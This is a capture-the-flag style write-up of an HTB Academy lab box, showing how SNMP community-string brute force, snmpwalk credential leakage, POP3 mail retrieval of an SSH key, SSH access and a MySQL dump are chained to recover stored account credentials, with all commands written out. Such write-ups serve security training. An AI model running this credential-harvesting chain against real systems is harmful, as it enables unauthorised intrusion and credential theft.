# NIXHARD - Hard

**Date Completed:** March 6, 2026  
**Difficulty:** Hard  
**Status:** ✅ PWNED

---

## Box Information

| Property | Value |
|----------|-------|
| OS | Linux (Ubuntu 20.04, Kernel 5.4.0-90-generic) |
| IP | 10.129.2.65 |
| Hostname | NIXHARD |
| Module | HTB Academy - Footprinting |

**Key Services:** SSH, POP3, IMAP, SNMP (UDP), MySQL (localhost)

---

## Machine Overview

NIXHARD is a Linux server functioning as an MX (mail exchange) and management server for the internal network, doubling as a backup server for domain account credentials. The box teaches a critical lesson: **UDP services can be invisible when using a TCP-based VPN tunnel**, and SNMP on management servers is often a goldmine of leaked credentials. The attack chain spans five protocols: SNMP → POP3 → SSH → MySQL, culminating in the recovery of backed-up domain credentials from a MySQL database.

---

## Key Concepts Learned

- **TCP vs UDP VPN tunneling** — UDP scans are unreliable over a TCP VPN (TCP-over-TCP issue)
- SNMP community string brute-forcing with `onesixtyone`
- SNMP enumeration (`snmpwalk`) to extract credentials from running processes/scheduled tasks
- POP3 mail retrieval to extract SSH private keys
- SSH authentication using private key files
- MySQL enumeration for backed-up domain credentials
- Multi-protocol credential chaining (SNMP → POP3 → SSH → MySQL)

---

## Reconnaissance

### Phase 1: TCP Service Enumeration

**Command:**
```bash
sudo nmap -sV -sS 10.129.2.65
```
> SYN stealth scan with service version detection against the target's default TCP ports. Swap `10.129.2.65` for your target IP.

**Explanation:**
- `-sV`: Service version detection
- `-sS`: SYN stealth scan

**Results:**
```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
110/tcp open  pop3     Dovecot pop3d
143/tcp open  imap     Dovecot imapd (Ubuntu)
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp open  ssl/pop3 Dovecot pop3d
```

### Key TCP Findings

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 8.2p1 | Secure Shell |
| 110 | POP3 | Dovecot | Mail retrieval (plaintext) |
| 143 | IMAP | Dovecot | Mail access (plaintext) |
| 993 | IMAPS | Dovecot | Mail access (SSL/TLS) |
| 995 | POP3S | Dovecot | Mail retrieval (SSL/TLS) |

**SSL Certificate Info:** Hostname `NIXHARD` leaked from certificate subject.

### Phase 2: Initial Dead Ends

Several approaches were attempted and failed before discovering the correct attack vector:

1. **IMAP/POP3 brute force** — Hydra with `footprinting-wordlist.txt` against multiple usernames (`root`, `alex`, `htb`, `HTB`, `cry0l1t3`) returned zero results
2. **POP3 user enumeration** — POP3 `USER` command returns `+OK` for ALL usernames, preventing user enumeration
3. **Full TCP port scan** (`-p-`) — Confirmed only 5 TCP ports open
4. **UDP scan on TCP VPN** — Top 50 UDP ports showed nothing (due to TCP-over-TCP tunnel issue)
5. **Source port evasion** on filtered ports — All confirmed closed behind firewall
6. **SMTP ports** (25/587) — Not open

### Phase 3: The Breakthrough — UDP VPN + SNMP Discovery

**Critical Insight:** Switched from TCP VPN to **UDP VPN** connection. Previous UDP scans were unreliable because UDP traffic was being tunneled over TCP (TCP-over-TCP), causing packet loss and false negatives.

**Command:**
```bash
sudo nmap -sU -p 161 -sV 10.129.2.65
```
> UDP scan of SNMP port 161 only, with version detection — must be run over a UDP VPN or results are unreliable. Swap `10.129.2.65` for your target IP.

**Explanation:**
- `-sU`: UDP scan
- `-p 161`: Target SNMP port specifically
- `-sV`: Service version detection

**Results:**
```
PORT    STATE SERVICE VERSION
161/udp open  snmp    net-snmp; net-snmp SNMPv3 server
```

🎯 **SNMP is open on UDP 161!** This was completely invisible on the TCP VPN tunnel.

---

## Exploitation Chain

### Phase 1: SNMP Community String Brute Force

**Objective:** Discover the SNMP community string to query the management information base (MIB).

**Command:**
```bash
onesixtyone 10.129.2.65 -c ~/SecLists/Discovery/SNMP/snmp.txt
```
> Brute-forces the SNMP community string using a wordlist (`-c`). Swap `10.129.2.65` for your target IP and point `-c` at your SNMP community wordlist.

**Explanation:**
- `onesixtyone`: Fast SNMP community string scanner
- `-c`: Community string wordlist (SecLists SNMP wordlist with 3219 entries)

**Result:**
```
10.129.2.65 [backup] Linux NIXHARD 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
```

✅ **Community string discovered: `backup`**

Despite the server advertising SNMPv3, it also accepted SNMPv2c queries — a common misconfiguration.

### Phase 2: SNMP Enumeration — Credential Extraction

**Command:**
```bash
snmpwalk -v2c -c backup 10.129.2.65
```
> Dumps the entire SNMP MIB tree using SNMPv2c and the discovered community string — process args here leaked plaintext credentials. Swap `backup` for your community string and `10.129.2.65` for your target IP.

**Explanation:**
- `-v2c`: Use SNMP version 2c
- `-c backup`: Use discovered community string

**Key Findings from SNMP Walk:**

| OID Path | Data |
|----------|------|
| `iso.3.6.1.2.1.1.4.0` | `Admin <tech@inlanefreight.htb>` |
| `iso.3.6.1.2.1.1.5.0` | `NIXHARD` (hostname) |
| `iso.3.6.1.2.1.1.6.0` | `Inlanefreight` (organization) |
| `iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80` | `/opt/tom-recovery.sh` (recovery script) |
| `iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80` | `tom NMds732Js2761` (credentials!) |

**Leaked Credentials:** `tom:NMds732Js2761`

The SNMP MIB exposed a scheduled recovery script (`/opt/tom-recovery.sh`) along with its **arguments in plaintext** — username `tom` and password `NMds732Js2761`. The script used `chpasswd` to reset tom's password:

```bash
#!/bin/bash
echo $1:$2 | chpasswd
```

Error output was also visible in SNMP:
```
chpasswd: (user tom) pam_chauthtok() failed, error:
Authentication token manipulation error
```

### Phase 3: POP3 — SSH Private Key Retrieval

**Objective:** Use tom's credentials to check his mailbox for additional information.

**Command:**
```bash
telnet 10.129.2.65 110
```
> Opens a raw connection to plaintext POP3 (port 110). Swap `10.129.2.65` for your target IP; use port 110 to avoid SSL errors on 995.

```
USER tom
PASS NMds732Js2761
LIST
RETR 1
```
> POP3 commands typed inside the telnet session: authenticate with `USER`/`PASS`, `LIST` enumerates messages, `RETR 1` reads message 1. Swap the username and password for your captured credentials.

**Explanation:**
- Connected to plaintext POP3 (port 110) to avoid SSL renegotiation errors on port 995
- Authenticated as `tom` with the SNMP-leaked password
- Retrieved 1 message (3661 bytes)

**Result:** Tom's email contained a **complete OpenSSH private key**:

```
From: [Admin] <tech@inlanefreight.htb>
To: <tom@inlanefreight.htb>
Subject: KEY

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEA9snuYvJaB/QOnkaAs92nyBKypu73HMxyU9XWTS+UBbY3lVFH0t+F
[...truncated...]
-----END OPENSSH PRIVATE KEY-----
```

### Phase 4: SSH Access as Tom

**Commands:**
```bash
# Save the private key from the email
nano /tmp/tom_key
# (paste key contents)

# Set proper permissions (SSH requires 600)
chmod 600 /tmp/tom_key

# Connect using the private key
ssh -i /tmp/tom_key tom@10.129.2.65
```
> Save the recovered private key to a file, lock it down to `600` (SSH refuses world-readable keys), then authenticate with `-i`. Swap the key path, username `tom`, and `10.129.2.65` for your values.

✅ **Shell obtained as `tom` on NIXHARD**

### Phase 5: Local Enumeration

**User Discovery:**
```bash
cat /etc/passwd | grep -v nologin
```
> Lists only interactive accounts by filtering out `nologin` service accounts — fast way to spot real login users post-shell. Run on the compromised host as-is.
```
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
cry0l1t3:x:1001:1001:,,,:/home/cry0l1t3:/bin/bash
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
tom:x:1002:1002:,,,:/home/tom:/bin/bash
```

**Key Finding:** No `htb` system user exists. MySQL is installed. The `htb` credentials must be stored in the MySQL database (consistent with the box being a "backup server for internal domain accounts").

### Phase 6: MySQL — Domain Credential Recovery

**Command:**
```bash
mysql -u tom -p
# Password: NMds732Js2761
```
> Connects to the local MySQL instance reusing tom's password (`-p` prompts for it). Swap `tom` for the username and supply the matching password.

**Database Enumeration:**
```sql
SHOW DATABASES;
```
> Run at the MySQL prompt to list all databases — first step in finding the credential store. No arguments to change.
```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+
```

```sql
USE users;
SHOW TABLES;
```
> Selects the `users` database and lists its tables. Swap `users` for whichever database name looked interesting in `SHOW DATABASES;`.
```
+-----------------+
| Tables_in_users |
+-----------------+
| users           |
+-----------------+
```

```sql
SELECT * FROM users;
```
> Dumps every row of the `users` table — the backed-up domain credentials. Swap `users` for the target table name from `SHOW TABLES;`.

✅ **HTB user credentials recovered from the `users` database!**

---

## Attack Summary

```
UDP VPN Switch (Critical!)
    │
    └─> SNMP (UDP 161)
            │
            └─> onesixtyone brute force ──> community string: "backup"
                    │
                    └─> snmpwalk ──> /opt/tom-recovery.sh ──> tom:NMds732Js2761
                            │
                            └─> POP3 (110) ──> tom's email ──> SSH Private Key
                                    │
                                    └─> SSH (22) ──> Shell as tom
                                            │
                                            └─> MySQL ──> users.users ──> HTB credentials
```

1. Initial TCP scan found only SSH and mail services (POP3/IMAP)
2. All brute force attempts against mail services failed
3. **Switched from TCP VPN to UDP VPN** — critical infrastructure change
4. Targeted UDP scan discovered **SNMP on port 161**
5. `onesixtyone` brute-forced community string: `backup`
6. `snmpwalk` leaked recovery script credentials: `tom:NMds732Js2761`
7. Authenticated to POP3 as tom — retrieved SSH private key from email
8. SSH'd into box as tom using the private key
9. Connected to local MySQL with tom's credentials
10. **Dumped `users` database — recovered `htb` domain credentials**

---

## Key Techniques Used

- **Nmap TCP/UDP:** Port scanning with targeted UDP scan for SNMP (`-sU -p 161`)
- **onesixtyone:** SNMP community string brute-forcing with SecLists wordlist
- **snmpwalk:** Full SNMP MIB tree enumeration to extract system information and credentials
- **telnet (POP3):** Mail retrieval to extract SSH private key from email
- **SSH with private key:** `-i` flag for key-based authentication
- **MySQL CLI:** Database enumeration and credential recovery

---

## Tools Used

- Nmap (TCP/UDP port scanning)
- onesixtyone (SNMP community string brute force)
- snmpwalk (SNMP enumeration)
- telnet (POP3 mail access)
- OpenSSL s_client (IMAPS/POP3S testing)
- Hydra (brute force attempts — unsuccessful)
- SSH (remote shell access)
- MySQL CLI (database enumeration)

---

## Lessons Learned

1. **TCP VPN Kills UDP Scans** — This is THE lesson of this box. UDP traffic tunneled over a TCP VPN connection (TCP-over-TCP) is unreliable. SNMP was completely invisible until switching to a UDP VPN tunnel. **Always use a UDP VPN when performing UDP enumeration.**

2. **SNMP is a Goldmine on Management Servers** — The box description said "management server" — that's a strong hint for SNMP. Management servers commonly run SNMP for monitoring, and it can leak running processes, scheduled tasks, credentials, and system configuration.

3. **Community Strings Aren't Always `public`** — The community string `backup` would never be found by guessing. Tools like `onesixtyone` with a comprehensive wordlist are essential for SNMP enumeration.

4. **SNMPv3 Doesn't Mean SNMPv2c is Disabled** — The server advertised SNMPv3, but still accepted SNMPv2c queries with a community string. Always test lower protocol versions.

5. **Credentials Chain Across Protocols** — Each credential unlocked the next service: SNMP → POP3 → SSH → MySQL. No single credential gave direct access to the target — patience and methodical enumeration were required.

6. **Check Email for Keys and Credentials** — Email (POP3/IMAP) is frequently used in CTFs and real engagements to distribute SSH keys, passwords, and sensitive information. Always check mailboxes when you have credentials.

7. **No System User ≠ No Credentials** — The target user `htb` didn't exist in `/etc/passwd`. The credentials were stored in a MySQL database as part of a domain account backup system. Think beyond local user accounts.

8. **SSL Renegotiation Workaround** — When `openssl s_client` fails with SSL renegotiation errors on port 995, use plaintext POP3 on port 110 instead. Both were available.

---

## Pro Tips

- Run `sudo nmap -sU -p 161,162 <target>` early in every engagement — SNMP is one of the most commonly overlooked services
- **Always verify your VPN transport**: `grep -i "proto" your-vpn-file.ovpn` to check TCP vs UDP
- Use `onesixtyone` before `snmpwalk` — it's much faster for discovering community strings
- When `snmpwalk` output is huge, filter for interesting strings: `snmpwalk -v2c -c <community> <target> | grep -i "pass\|user\|login\|key\|secret"`
- The OID `iso.3.6.1.2.1.25.1.7` (hrSystemInitialLoadParameters) often contains boot parameters and scheduled task info
- Save SSH keys with `chmod 600` — SSH will refuse to use keys with open permissions
- If POP3S (995) gives SSL errors, fall back to plaintext POP3 (110) — many servers run both

---

## References

- [SNMP Pentesting - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp)
- [onesixtyone - SNMP Scanner](https://github.com/trailofbits/onesixtyone)
- [Net-SNMP snmpwalk Documentation](http://www.net-snmp.org/docs/man/snmpwalk.html)
- [POP3 Protocol Commands](https://www.electrictoolbox.com/article/networking/pop3-commands/)
- [SSH Key Authentication](https://www.ssh.com/academy/ssh/key)
- [HTB Academy - Footprinting Module](https://academy.hackthebox.com/module/details/18)

---

## Box Statistics

- **Difficulty:** Hard
- **Attack Complexity:** High (multi-protocol chain, UDP VPN requirement)
- **Skills Required:** SNMP, POP3, SSH, MySQL, VPN troubleshooting
- **Key Skill:** Understanding VPN transport protocols and their impact on UDP scanning
- **Biggest Challenge:** Realizing SNMP was hidden behind a TCP VPN tunnel — all methodology was correct, but infrastructure was preventing discovery
- **Time to Solve:** Extended session (stuck on TCP VPN), solved quickly after UDP VPN switch

---

## Critical Takeaway

> **If you're stuck and feel like you've "tried everything," question your infrastructure before questioning your methodology.** The entire box was gated behind a VPN transport protocol issue. Every technique used was standard — the only thing wrong was the tunnel carrying the traffic. This applies to real-world engagements too: firewalls, NAT, VPNs, and routing can all silently drop traffic that would otherwise reveal critical services.

---

## Notes

This box is an excellent exercise in multi-protocol footprinting and teaches the critical importance of UDP enumeration — particularly SNMP — on management and infrastructure servers. The most valuable lesson is non-technical: when you're stuck, examine your assumptions about the environment itself (VPN, routing, firewalls) rather than assuming the target has no attack surface. The credential chain (SNMP → POP3 → SSH → MySQL) demonstrates how real-world lateral movement works — each piece of information unlocks the next door.

**Status:** BOX PWNED ✅
